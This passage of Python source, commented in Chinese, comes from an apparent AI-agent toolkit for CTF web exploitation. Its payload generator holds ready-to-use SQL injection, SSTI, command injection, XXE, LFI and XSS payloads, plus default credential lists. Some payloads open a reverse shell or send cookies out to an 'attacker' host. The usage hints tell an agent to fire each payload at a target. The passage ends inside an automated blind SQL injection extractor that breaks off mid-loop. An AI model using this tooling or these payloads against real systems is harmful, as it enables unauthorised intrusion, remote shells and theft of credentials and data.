                body_stripped = body.strip()
                if body_stripped.startswith("{"):
                    try:
                        json_data = _json.loads(body_stripped)
                        kwargs["json"] = json_data
                    except _json.JSONDecodeError:
                        kwargs["data"] = body
                elif "=" in body_stripped and "{" not in body_stripped:
                    # 表单格式
                    form_data = {}
                    for pair in body_stripped.split("&"):
                        if "=" in pair:
                            k, v = pair.split("=", 1)
                            form_data[k] = v
                    kwargs["data"] = form_data
                else:
                    # 原始文本
                    kwargs["data"] = body

            # 发送请求
            method_upper = method.upper()
            async with session.request(method_upper, url, **kwargs) as resp:
                resp_body = await resp.text()

                # 记录重定向链
                if hasattr(resp, 'history') and resp.history:
                    for r in resp.history:
                        redirects.append({
                            "url": str(r.url),
                            "status": r.status,
                            "location": r.headers.get("Location", ""),
                        })

                # HTML归一化：剥样式标签+实体反转义，源码直接可读、体积缩小
                is_html = _looks_like_html(resp_body)
                norm_body = _normalize_html(resp_body) if is_html else resp_body
                # 分段切片（offset/limit 基于归一化后的文本）
                start = max(0, int(body_offset or 0))
                limit = max(1, int(body_limit or 10000))
                return {
                    "success": True,
                    "status": resp.status,
                    "body": norm_body[start:start + limit],
                    "body_total": len(norm_body),
                    "body_offset": start,
                    "body_truncated": (start + limit) < len(norm_body),
                    "_kind": "html" if is_html else "text",
                    "headers": dict(resp.headers),
                    "url": str(resp.url),
                    "redirects": redirects,
                    "method": method_upper,
                }

    except asyncio.TimeoutError:
        return {
            "success": False,
            "error": f"请求超时({timeout}秒)",
            "url": url,
        }
    except aiohttp.ClientError as e:
        return {
            "success": False,
            "error": f"连接错误: {str(e)}",
            "url": url,
        }
    except Exception as e:
        return {
            "success": False,
            "error": f"请求失败: {str(e)}",
            "url": url,
        }


# === Payload生成工具（解决AI写循环批量测试代码被截断导致语法错误的问题）===
# 背景：AI倾向于用execute_python写"循环测试多种变体"的脚本，代码超长被LLM输出截断，
#       导致JSON解析失败、括号未闭合、SyntaxError。此工具直接返回各类payload列表，
#       AI无需自己写循环代码，配合http_raw逐个测试即可。

# IP伪造headers变体（用于绕过IP白名单/黑名单、本地访问限制）
_PAYLOAD_IP_BYPASS = [
    {"name": "X-Forwarded-For: 127.0.0.1", "headers": "X-Forwarded-For: 127.0.0.1"},
    {"name": "X-Real-IP: 127.0.0.1", "headers": "X-Real-IP: 127.0.0.1"},
    {"name": "Client-IP: 127.0.0.1", "headers": "Client-IP: 127.0.0.1"},
    {"name": "X-Client-IP: 127.0.0.1", "headers": "X-Client-IP: 127.0.0.1"},
    {"name": "X-Originating-IP: 127.0.0.1", "headers": "X-Originating-IP: 127.0.0.1"},
    {"name": "X-Remote-IP: 127.0.0.1", "headers": "X-Remote-IP: 127.0.0.1"},
    {"name": "X-Remote-Addr: 127.0.0.1", "headers": "X-Remote-Addr: 127.0.0.1"},
    {"name": "Forwarded: for=127.0.0.1", "headers": "Forwarded: for=127.0.0.1"},
    {"name": "Host: 127.0.0.1", "headers": "Host: 127.0.0.1"},
    {"name": "Host: localhost", "headers": "Host: localhost"},
    {"name": "X-Forwarded-Host: 127.0.0.1", "headers": "X-Forwarded-Host: 127.0.0.1"},
    {"name": "X-Host: 127.0.0.1", "headers": "X-Host: 127.0.0.1"},
    {"name": "Referer: http://127.0.0.1/", "headers": "Referer: http://127.0.0.1/"},
    {"name": "X-Forwarded-For: 127.0.0.1, 127.0.0.1", "headers": "X-Forwarded-For: 127.0.0.1, 127.0.0.1"},
    {"name": "X-Forwarded-For: 10.0.0.1", "headers": "X-Forwarded-For: 10.0.0.1"},
    {"name": "X-Forwarded-For: 192.168.1.1", "headers": "X-Forwarded-For: 192.168.1.1"},
    {"name": "X-Real-IP: 0.0.0.0", "headers": "X-Real-IP: 0.0.0.0"},
    {"name": "X-Forwarded-For: [::1]", "headers": "X-Forwarded-For: [::1]"},
    {"name": "Host: 127.0.0.1:80", "headers": "Host: 127.0.0.1:80"},
    {"name": "X-Forwarded-For: 127.0.0.1\\nHost: localhost", "headers": "X-Forwarded-For: 127.0.0.1\nHost: localhost"},
    # 组合头（多个IP伪造头同时使用）
    {"name": "ALL_IP_HEADERS", "headers": "X-Forwarded-For: 127.0.0.1\nX-Real-IP: 127.0.0.1\nClient-IP: 127.0.0.1\nX-Client-IP: 127.0.0.1\nX-Originating-IP: 127.0.0.1\nForwarded: for=127.0.0.1\nX-Remote-Addr: 127.0.0.1"},
]

# User-Agent绕过变体（用于绕过UA校验、本地访问限制）
_PAYLOAD_UA_BYPASS = [
    {"name": "UA: local", "ua": "local"},
    {"name": "UA: localhost", "ua": "localhost"},
    {"name": "UA: 127.0.0.1", "ua": "127.0.0.1"},
    {"name": "UA: internal", "ua": "internal"},
    {"name": "UA: admin", "ua": "admin"},
    {"name": "UA: crawler", "ua": "crawler"},
    {"name": "UA: bot", "ua": "bot"},
    {"name": "UA: spider", "ua": "spider"},
    {"name": "UA: Googlebot", "ua": "Googlebot/2.1 (+http://www.google.com/bot.html)"},
    {"name": "UA: Baiduspider", "ua": "Baiduspider+(+http://www.baidu.com/search/spider.htm)"},
    {"name": "UA: curl", "ua": "curl/7.68.0"},
    {"name": "UA: wget", "ua": "Wget/1.20.3 (linux-gnu)"},
    {"name": "UA: Python-requests", "ua": "python-requests/2.25.1"},
    {"name": "UA: Python-urllib", "ua": "Python-urllib/3.9"},
    {"name": "UA: local_man", "ua": "local_man"},
    {"name": "UA: localman", "ua": "localman"},
    {"name": "UA: Mozilla+local", "ua": "Mozilla/5.0 (local)"},
    {"name": "UA: empty", "ua": ""},
    {"name": "UA: Internal-Admin", "ua": "Internal-Admin"},
    {"name": "UA: HealthCheck", "ua": "HealthCheck/1.0"},
]

# 文件包含路径变体
_PAYLOAD_LFI_PATHS = [
    "/etc/passwd",
    "/etc/shadow",
    "/etc/hosts",
    "/etc/hostname",
    "/etc/passwd%00",
    "/etc/passwd%00.jpg",
    "/etc/passwd%00.html",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "/proc/self/environ",
    "/proc/self/cmdline",
    "/proc/self/status",
    "/var/log/apache2/access.log",
    "/var/log/nginx/access.log",
    "/var/log/auth.log",
    "/var/www/html/.env",
    "/var/www/html/config.php",
    "/var/www/html/flag",
    "/var/www/html/flag.txt",
    "/var/www/html/flag.php",
    "/flag",
    "/flag.txt",
    "/flag.php",
    "/root/.bash_history",
    "/root/.ssh/id_rsa",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/convert.base64-encode/resource=flag.php",
    "php://filter/convert.base64-encode/resource=config.php",
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "php://filter/read=convert.base64-encode/resource=index.php",
    "php://input",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+",
    "data://text/plain,<?php system('id')?>",
    "expect://id",
    "file:///etc/passwd",
    "php://filter/convert.base64-encode/resource=../../../etc/passwd",
    "....//....//....//etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
]

# 目录爆破字典（CTF常用敏感路径）
_PAYLOAD_DIR_WORDLIST = [
    "admin", "admin/", "admin.php", "admin/index.php", "admin/login.php",
    "login", "login.php", "login.html",
    "flag", "flag.php", "flag.txt", "flag/", "getflag", "getflag.php",
    "robots.txt", "sitemap.xml", ".htaccess", ".git/config", ".git/HEAD",
    ".env", "config.php", "config.ini", "config.json", "config.yml", "config.yaml",
    "backup", "backup.zip", "backup.tar.gz", "backup.sql", "db.sql",
    "upload", "upload.php", "uploads/", "uploads.php",
    "shell.php", "shell.php.bak", "cmd.php", "webshell.php",
    "test", "test.php", "debug", "debug.php", "info.php", "phpinfo.php",
    "api", "api/v1", "api/v1/users", "api/login",
    "user", "user.php", "users.php",
    "index.php.bak", "index.bak", "www.zip", "www.tar.gz", "web.zip",
    ".DS_Store", ".svn/entries", ".idea/",
    "console", "shell", "terminal",
    "source", "source.php", "src/",
    "include", "include.php", "includes/",
    "config", "configuration",
    "system", "system.php",
    "private", "secret", "hidden",
    "1.php", "1.txt", "1.html",
    "readme", "readme.txt", "readme.md", "README.md",
    "changelog", "changelog.txt",
    "download", "download.php",
    "file", "file.php", "files/",
    "log", "log.php", "logs/",
    "phpmyadmin", "pma", "mysql", "sql",
    ".git/", ".svn/", ".hg/",
    "swagger.json", "swagger-ui",
    "actuator", "actuator/env", "actuator/health",
    "metrics", "env", "health",
]

# SQL注入payload
_PAYLOAD_SQLI = [
    "'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1", "' OR 1=1--", "\" OR 1=1--",
    "' OR 1=1#", "\" OR 1=1#", "' OR 1=1-- -", "'--", "\"--",
    "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--", "' UNION SELECT NULL,NULL,NULL--",
    "admin'--", "admin'#", "admin' OR '1'='1'--",
    "' AND SLEEP(5)--", "\" AND SLEEP(5)--", "' AND BENCHMARK(5000000,MD5(1))--",
    "1; DROP TABLE users--", "1; SELECT * FROM users--",
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "' UNION SELECT user,password FROM users--",
    "' UNION SELECT table_name,2 FROM information_schema.tables--",
    "' UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users'--",
    "admin' OR '1'='1'/*", "admin' OR 1=1#",
    "' OR ''='", "' OR 'x'='x",
    "1' AND ASCII(SUBSTRING((SELECT database()),1,1))>50--",
    "' AND IF(1=1,SLEEP(5),0)--",
    "' /*!50000UNION*/ SELECT NULL--",
    "0x31", "CHAR(49,48,48)",
    "' OR 1=1 LIMIT 1--",
    "' UNION ALL SELECT NULL,NULL,NULL--",
]

# SSTI payload
_PAYLOAD_SSTI = [
    "{{7*7}}", "{{7*'7'}}", "${7*7}", "#{7*7}", "<%= 7*7 %>",
    "{{config}}", "{{config.items()}}", "{{request}}", "{{request.application}}",
    "{{''.__class__.__mro__[1].__subclasses__()}}",
    "{{''.__class__.__mro__[2].__subclasses__()}}",
    "{{().__class__.__bases__[0].__subclasses__()}}",
    "{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}",
    "{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').readlines()}}",
    "{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__(\"os\").popen(\"id\").read()')}}",
    "{%import os%}{{os.popen('id').read()}}",
    "{{self.__init__.__globals__['__builtins__']['eval']('__import__(\"os\").popen(\"id\").read()')}}",
    "{{lipsum.__globals__['os'].popen('id').read()}}",
    "{{cycler.__init__.__globals__.os.popen('id').read()}}",
    "{{joiner.__init__.__globals__.os.popen('id').read()}}",
    "{{namespace.__init__.__globals__.os.popen('id').read()}}",
    "{{request['__class__']['__mro__'][1]['__subclasses__']()}}",
    "{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}",
    "{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}",
    "{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__']['eval'](\"__import__('os').popen('id').read()\") }}{% endif %}{% endfor %}",
    "{{ class }}", "{{ dir(class) }}", "{{ ''.__class__ }}",
    "${T(java.lang.Runtime).getRuntime().exec('id')}",
    "{{ 'id'|cmd }}",
    "{{ '7'*7 }}",
    "{{ ''.__class__.__mro__[1].__subclasses__()[71].__init__.__globals__['os'].popen('id').read() }}",
]

# 命令注入payload
_PAYLOAD_CMDI = [
    "; id", "| id", "&& id", "|| id", "& id", "`id`", "$(id)",
    ";id", "|id", "&&id",
    "; cat /etc/passwd", "| cat /etc/passwd", "&& cat /etc/passwd",
    "; ls -la", "| ls -la", "&& ls -la",
    "; cat /flag", "| cat /flag", "&& cat /flag",
    "; cat /flag.txt", "| cat /flag.txt", "&& cat /flag.txt",
    "; whoami", "| whoami", "&& whoami",
    "; cat /etc/hostname", "| cat /etc/hostname",
    "; find / -name flag* 2>/dev/null", "| find / -name flag* 2>/dev/null",
    "; ls /", "| ls /",
    "%3B%20id", "%7C%20id", "%26%26%20id",
    "0x3b id", "0x7c id",
    "$IFS id", ";$IFS id",
    "{id,}", ";{id}",
    "; cat /proc/self/environ",
    "; env",
    "; set",
    "|| id ;", "&& id #",
    "; cat /var/log/apache2/access.log",
    "; php -r 'system(\"id\");'",
    "; python -c 'import os; os.system(\"id\")'",
    "; perl -e 'system(\"id\")'",
    "; ruby -e 'system(\"id\")'",
    "; nc -e /bin/sh attacker 4444",
    "; bash -i >& /dev/tcp/attacker/4444 0>&1",
]

# XXE payload
_PAYLOAD_XXE = [
    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///flag\">]><foo>&xxe;</foo>",
    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///flag.txt\">]><foo>&xxe;</foo>",
    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://attacker.com/\">]><foo>&xxe;</foo>",
    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\">%xxe;]><foo/>",
    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">]><foo>&xxe;</foo>",
    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/read=convert.base64-encode/resource=index.php\">]><foo>&xxe;</foo>",
    "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY file SYSTEM \"file:///etc/shadow\">]><data>&file;</data>",
    "<?xml version=\"1.0\" encoding=\"utf-8\"?><!DOCTYPE data [<!ENTITY dtd SYSTEM \"http://attacker.com/evil.dtd\">]><data>&dtd;</data>",
    "<?xml version=\"1.0\"?><!DOCTYPE replace [<!ENTITY info \"Any text\">]><root>&info;</root>",
    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///proc/self/environ\">]><foo>&xxe;</foo>",
    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///var/www/html/config.php\">]><foo>&xxe;</foo>",
]

# 反序列化payload（PHP/Python常见类名）
_PAYLOAD_DESERIALIZE_HINTS = [
    {"lang": "php", "class": "stdClass", "note": "PHP基础类，常用于构造POP链起点"},
    {"lang": "php", "class": "Exception", "note": "可触发__toString"},
    {"lang": "php", "class": "Error", "note": "PHP7+，可触发__toString"},
    {"lang": "php", "class": "SplFileObject", "note": "可用于读文件：__toString触发读取"},
    {"lang": "php", "class": "SplFileInfo", "note": "文件信息类"},
    {"lang": "php", "class": "GlobIterator", "note": "可遍历目录：FilesystemIterator子类"},
    {"lang": "php", "class": "SplStack", "note": "可触发__wakeup"},
    {"lang": "php", "class": "SplQueue", "note": "可触发__wakeup"},
    {"lang": "php", "class": "ArrayObject", "note": "可触发__wakeup，常作POP链入口"},
    {"lang": "php", "class": "Serializable", "note": "自定义序列化接口"},
    {"lang": "php", "class": "DateTime", "note": "可触发__wakeup"},
    {"lang": "php", "class": "DateInterval", "note": "可触发__wakeup"},
    {"lang": "php", "class": "SplDoublyLinkedList", "note": "可触发__wakeup"},
    {"lang": "python", "class": "os._wrap_close", "note": "Python反序列化常用：os.system('cmd')入口"},
    {"lang": "python", "class": "subprocess.Popen", "note": "可执行命令"},
    {"lang": "python", "class": "commands.getoutput", "note": "Python2命令执行"},
    {"lang": "python", "class": "builtins.eval", "note": "执行任意代码"},
    {"lang": "python", "class": "builtins.exec", "note": "执行任意代码"},
]

# 认证绕过payload
_PAYLOAD_AUTH_BYPASS = [
    {"name": "admin:admin", "user": "admin", "pass": "admin"},
    {"name": "admin:password", "user": "admin", "pass": "password"},
    {"name": "admin:123456", "user": "admin", "pass": "123456"},
    {"name": "admin:admin123", "user": "admin", "pass": "admin123"},
    {"name": "admin:root", "user": "admin", "pass": "root"},
    {"name": "admin:toor", "user": "admin", "pass": "toor"},
    {"name": "root:root", "user": "root", "pass": "root"},
    {"name": "root:toor", "user": "root", "pass": "toor"},
    {"name": "root:password", "user": "root", "pass": "password"},
    {"name": "test:test", "user": "test", "pass": "test"},
    {"name": "test:123456", "user": "test", "pass": "123456"},
    {"name": "guest:guest", "user": "guest", "pass": "guest"},
    {"name": "user:user", "user": "user", "pass": "user"},
    {"name": "admin:admin@123", "user": "admin", "pass": "admin@123"},
    {"name": "admin:P@ssw0rd", "user": "admin", "pass": "P@ssw0rd"},
    {"name": "admin:admin888", "user": "admin", "pass": "admin888"},
    {"name": "admin:12345678", "user": "admin", "pass": "12345678"},
    {"name": "admin:admin.com", "user": "admin", "pass": "admin.com"},
    {"name": "admin:qwerty", "user": "admin", "pass": "qwerty"},
    {"name": "admin:letmein", "user": "admin", "pass": "letmein"},
    {"name": "admin:welcome", "user": "admin", "pass": "welcome"},
    {"name": "admin:monkey", "user": "admin", "pass": "monkey"},
    {"name": "admin:abc123", "user": "admin", "pass": "abc123"},
    {"name": "admin:1234", "user": "admin", "pass": "1234"},
    {"name": "admin:password1", "user": "admin", "pass": "password1"},
    {"name": "admin:iloveyou", "user": "admin", "pass": "iloveyou"},
    {"name": "admin:trustno1", "user": "admin", "pass": "trustno1"},
    {"name": "admin:shadow", "user": "admin", "pass": "shadow"},
    {"name": "admin:pass", "user": "admin", "pass": "pass"},
    {"name": "admin:password123", "user": "admin", "pass": "password123"},
    {"name": "SQL: ' OR '1'='1", "user": "admin' OR '1'='1'--", "pass": "anything"},
    {"name": "SQL: \" OR \"1\"=\"1", "user": "admin\" OR \"1\"=\"1\"--", "pass": "anything"},
    {"name": "SQL: ' OR 1=1--", "user": "' OR 1=1--", "pass": "anything"},
    {"name": "SQL: admin'--", "user": "admin'--", "pass": "anything"},
    {"name": "SQL: admin'#", "user": "admin'#", "pass": "anything"},
    {"name": "Empty user/pass", "user": "", "pass": ""},
    {"name": "Null byte user", "user": "admin%00", "pass": "admin%00"},
    {"name": "Array bypass", "user": "admin[]", "pass": "admin[]"},
    {"name": "Array bypass2", "user": ["admin"], "pass": ["admin"]},
]

# XSS payload（用于测试和绕过）
_PAYLOAD_XSS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<details open ontoggle=alert(1)>",
    "\" onmouseover=alert(1) x=\"",
    "' onmouseover=alert(1) x='",
    "<a href=javascript:alert(1)>x</a>",
    "<script>document.cookie</script>",
    "<img src=x onerror=document.location='http://attacker/?c='+document.cookie>",
    "<svg><script>alert(1)</script></svg>",
    "<ScRiPt>alert(1)</ScRiPt>",
    "<scr<script>ipt>alert(1)</script>",
    "<img src=x:alert(alt) onerror=eval(src) alt=xss>",
    "<<script>script>alert(1)</script>",
    "<script>fetch('http://attacker/?c='+document.cookie)</script>",
    "javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
    "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert(1)\">",
]

_PAYLOAD_CATEGORIES = {
    "ip_bypass": ("IP伪造headers变体(用于绕过IP白名单/本地访问限制)", _PAYLOAD_IP_BYPASS),
    "ua_bypass": ("User-Agent绕过变体(用于绕过UA校验/本地访问标记)", _PAYLOAD_UA_BYPASS),
    "lfi_paths": ("文件包含路径(本地文件包含LFI payload)", _PAYLOAD_LFI_PATHS),
    "dir_wordlist": ("目录爆破字典(CTF常用敏感路径)", _PAYLOAD_DIR_WORDLIST),
    "sqli": ("SQL注入payload(含UNION/布尔/时间盲注/报错)", _PAYLOAD_SQLI),
    "ssti": ("SSTI服务端模板注入payload(Jinja2/Twig/Freemarker等)", _PAYLOAD_SSTI),
    "cmdi": ("命令注入payload(; | && || $() `` 等变体)", _PAYLOAD_CMDI),
    "xxe": ("XXE外部实体注入payload(读文件/SSRF/OOB)", _PAYLOAD_XXE),
    "deserialize": ("反序列化提示(PHP/Python常见POP链入口类)", _PAYLOAD_DESERIALIZE_HINTS),
    "auth_bypass": ("认证绕过payload(弱口令+SQL注入绕过+数组绕过)", _PAYLOAD_AUTH_BYPASS),
    "xss": ("XSS payload(测试和绕过变体)", _PAYLOAD_XSS),
}


async def payload_gen(category: str = "", custom_data: str = "") -> Dict[str, Any]:
    """生成CTF常用payload列表，避免AI自己写循环代码导致被截断/语法错误。

    背景：AI用execute_python写"循环批量测试多种变体"的脚本时，代码超长会被LLM输出
    token限制截断，导致JSON解析失败、括号未闭合、SyntaxError。
    使用此工具获取payload列表后，配合http_raw逐个测试即可，无需写Python代码。

    Args:
        category: payload类别(必填)，可选值：
                  - ip_bypass: IP伪造headers变体(绕过IP白名单/本地访问限制)
                  - ua_bypass: User-Agent绕过变体(绕过UA校验/本地访问标记)
                  - lfi_paths: 文件包含路径(LFI payload)
                  - dir_wordlist: 目录爆破字典(CTF常用敏感路径)
                  - sqli: SQL注入payload(UNION/布尔/时间盲注/报错)
                  - ssti: SSTI服务端模板注入payload
                  - cmdi: 命令注入payload(; | && || $() `` 等)
                  - xxe: XXE外部实体注入payload
                  - deserialize: 反序列化提示(PHP/Python常见POP链入口类)
                  - auth_bypass: 认证绕过payload(弱口令+SQL注入绕过+数组绕过)
                  - xss: XSS payload(测试和绕过变体)
                  - list: 列出所有可用类别
        custom_data: 自定义数据(可选)，用于追加自定义payload到结果中。
                     格式：每行一个payload，自动合并到返回列表。

    Returns:
        dict: {
            success: bool,
            category: str,
            description: str,
            count: int,
            payloads: list,  # payload列表
            usage_hint: str,  # 使用提示，说明如何配合http_raw使用
        }
    """
    if not category:
        return {
            "success": False,
            "error": "category参数必填，传 'list' 查看所有可用类别",
            "available_categories": list(_PAYLOAD_CATEGORIES.keys()),
        }

    if category == "list":
        cats = []
        for k, (desc, _) in _PAYLOAD_CATEGORIES.items():
            cats.append({"category": k, "description": desc, "count": len(_PAYLOAD_CATEGORIES[k][1])})
        return {
            "success": True,
            "category": "list",
            "categories": cats,
            "usage_hint": (
                "调用 payload_gen(category='xxx') 获取payload列表，"
                "然后用 http_raw 逐个测试，无需写Python循环代码。"
                "示例：payload_gen(category='ip_bypass') 返回IP伪造头列表，"
                "然后对每个headers调用 http_raw(url=..., headers=payload['headers'])"
            ),
        }

    if category not in _PAYLOAD_CATEGORIES:
        return {
            "success": False,
            "error": f"未知类别: {category}",
            "available_categories": list(_PAYLOAD_CATEGORIES.keys()),
            "hint": "传 category='list' 查看所有可用类别",
        }

    desc, payloads = _PAYLOAD_CATEGORIES[category]
    result_payloads = list(payloads)

    # 合并自定义payload
    if custom_data:
        custom_lines = [line.strip() for line in custom_data.split("\n") if line.strip()]
        for i, line in enumerate(custom_lines):
            custom_entry = {"name": f"custom_{i+1}", "value": line}
            # 根据类别决定字段名
            if category == "ip_bypass":
                custom_entry["headers"] = line
            elif category == "ua_bypass":
                custom_entry["ua"] = line
            elif category in ("lfi_paths", "dir_wordlist", "sqli", "ssti", "cmdi", "xss"):
                custom_entry["value"] = line
            result_payloads.append(custom_entry)

    # 构造使用提示
    usage_hints = {
        "ip_bypass": "对每个payload调用 http_raw(url=目标URL, headers=payload['headers']) 测试。重点关注响应状态码和内容长度变化。",
        "ua_bypass": "对每个payload调用 http_raw(url=目标URL, headers='User-Agent: '+payload['ua']) 测试。重点关注响应内容差异。",
        "lfi_paths": "对每个payload调用 http_raw(url=目标URL+'?file='+payload) 或 http_raw(url=目标URL+payload) 测试。注意base64编码的响应需要解码。",
        "dir_wordlist": "对每个payload调用 http_raw(url=目标基础URL+'/'+payload) 测试。重点关注200/403响应。",
        "sqli": "对每个payload注入到参数中，用 http_raw(url=目标URL+'?id='+payload) 测试。注意URL编码。",
        "ssti": "对每个payload注入到参数中，用 http_raw(url=目标URL+'?name='+payload) 测试。重点看49、777777等运算结果。",
        "cmdi": "对每个payload注入到参数中，用 http_raw(url=目标URL+'?cmd='+payload) 测试。注意URL编码特殊字符。",
        "xxe": "用 http_raw(url=目标URL, method='POST', headers='Content-Type: application/xml', body=payload) 测试。",
        "deserialize": "查看payload中的类名和说明，构造对应的反序列化字符串。配合php_deserialize_generate或python_pickle_generate使用。",
        "auth_bypass": "对每个payload调用 http_raw(url=登录URL, method='POST', body='username='+payload['user']+'&password='+payload['pass']) 测试。",
        "xss": "对每个payload注入到参数中测试。重点看响应中payload是否原样返回。",
    }

    return {
        "success": True,
        "category": category,
        "description": desc,
        "count": len(result_payloads),
        "payloads": result_payloads,
        "usage_hint": usage_hints.get(category, "配合http_raw工具逐个测试payload。"),
    }


# === SQL盲注自动化提取工具（解决AI逐字符提取消耗大量迭代的问题）===
async def sqli_blind_extract(
    url: str,
    inject_param: str = "",
    true_marker: str = "",
    false_marker: str = "",
    query_template: str = "",
    method: str = "GET",
    body: str = "",
    headers: str = "",
    data_length: int = 0,
    charset: str = "",
    max_length: int = 100,
    timeout: int = 5
) -> Dict[str, Any]:
    """SQL盲注自动化提取数据（布尔盲注）

    通过二分查找逐字符提取数据，一次调用完成全部提取。
    解决AI用execute_python写盲注脚本被截断、消耗大量迭代的问题。

    Args:
        url: 目标URL (如 http://target/api/lookup.php?code=INJECT_HERE)
        inject_param: 注入点参数名(如 code)。如果URL中含INJECT_HERE则直接替换
        true_marker: 布尔为真时响应中的标志字符串(如 "found":true 或 "exists")
        false_marker: 布尔为假时响应中的标志字符串(如 "found":false)。可选，不填则用true_marker取反
        query_template: SQL注入模板，用{pos}表示字符位置，{char}表示ASCII码比较值
                       如: "x' OR (SELECT ASCII(SUBSTR(body,{pos},1)) FROM records WHERE is_public=false)>{char}--"
                       或PostgreSQL: "x' OR (SELECT ASCII(SUBSTRING(body,{pos},1)) FROM records WHERE is_public=false)>{char}--"
        method: GET或POST
        body: POST时的请求体模板，含INJECT_HERE占位符
        headers: 自定义headers (JSON字符串或Key: Value\\n格式)
        data_length: 已知数据长度(如通过之前的盲注已确认=43)。0表示自动检测
        charset: 限定字符集(如 "abcdef0123456789{}")，加速提取。空字符串则尝试全部可打印ASCII
        max_length: 最大提取长度(防止无限提取)，默认100
        timeout: 每个请求的超时秒数，默认5

    Returns:
        dict: {success, extracted_data, length, requests_count, elapsed}
    """
    import aiohttp
    import time
    import urllib.parse
    import json as json_mod

    start_time = time.time()
    requests_count = 0

    # 解析headers
    parsed_headers = {"User-Agent": "Mozilla/5.0"}
    if headers:
        try:
            parsed_headers = json_mod.loads(headers)
        except json_mod.JSONDecodeError:
            for line in headers.split("\n"):
                if ":" in line:
                    k, v = line.split(":", 1)
                    parsed_headers[k.strip()] = v.strip()

    async def make_request(payload: str) -> str:
        """发送注入请求，返回响应文本"""
        nonlocal requests_count
        requests_count += 1

        # 构造实际URL
        if "INJECT_HERE" in url:
            actual_url = url.replace("INJECT_HERE", urllib.parse.quote(payload))
        elif inject_param:
            sep = "&" if "?" in url else "?"
            actual_url = f"{url}{sep}{inject_param}={urllib.parse.quote(payload)}"
        else:
            actual_url = url

        try:
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=timeout)) as session:
                if method.upper() == "POST":
                    post_data = body.replace("INJECT_HERE", payload) if body else payload
                    async with session.post(actual_url, data=post_data, headers=parsed_headers, allow_redirects=False) as resp:
                        return await resp.text()
                else:
                    async with session.get(actual_url, headers=parsed_headers, allow_redirects=False) as resp:
                        return await resp.text()
        except Exception as e:
            return ""

    def is_true(response_text: str) -> bool:
        """判断响应是否表示布尔为真"""
        if true_marker and true_marker in response_text:
            return True
        if false_marker and false_marker not in response_text:
            return True
        if true_marker and true_marker not in response_text:
            return False
        # 没有明确marker时无法判断
        return false_marker == "" and len(response_text) > 0

    try:
        # 1. 确定数据长度
        if data_length == 0:
            logger.info("自动检测数据长度...")
            for length in range(1, max_length + 1):
                payload = query_template.replace("{pos}", str(length)).replace("{char}", "0")
                # 测试 length(body) > length
                # 构造长度测试payload
                length_query = f"x' OR length(({query_template.split('OR')[1].split('>{')[0].strip()}))>{length}--"
                # 简化：直接用模板测试位置length是否存在
                test_payload = query_template.replace("{pos}", str(length)).replace("{char}", "32")  # 空格以上
                resp = await make_request(test_payload)
                if not is_true(resp):
                    data_length = length - 1
                    break
            else:
                data_length = max_length
            logger.info(f"数据长度: {data_length}")

        if data_length == 0:
            return {"success": False, "error": "无法确定数据长度", "requests_count": requests_count}

        # 2. 逐字符二分查找提取
        extracted = ""
        # 默认字符集：可打印ASCII
        if not charset:
            # 先尝试常见flag字符集，加速
            fast_charset = "abcdefghijklmnopqrstuvwxyz0123456789_{}-ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*().,;:"
        else:
            fast_charset = charset

        for pos in range(1, data_length + 1):
            # 二分查找ASCII码
            low, high = 32, 126  # 可打印ASCII范围

            while low < high:
                mid = (low + high) // 2
                payload = query_template.replace("{pos}", str(pos)).replace("{char}", str(mid))
                resp = await make_request(payload)

                if is_true(resp):
                    low = mid + 1
                else:
                    high = mid

            char = chr(low)
            extracted += char
            logger.debug(f"位置{pos}: '{char}' (ASCII={low}), 累计: {extracted}")

            # 如果已知前缀且当前字符不匹配，可能是字符集范围不够
            if low > 126 or low < 32:
                logger.warning(f"位置{pos}: 非可打印字符(ASCII={low})，尝试扩展范围")
                # 尝试0-255
                low2, high2 = 0, 255
                while low2 < high2:
                    mid = (low2 + high2) // 2
                    payload = query_template.replace("{pos}", str(pos)).replace("{char}", str(mid))
                    resp = await make_request(payload)
                    if is_true(resp):
                        low2 = mid + 1
                    else:
                        high2 = mid
                char = chr(low2)
                extracted = extracted[:-1] + char

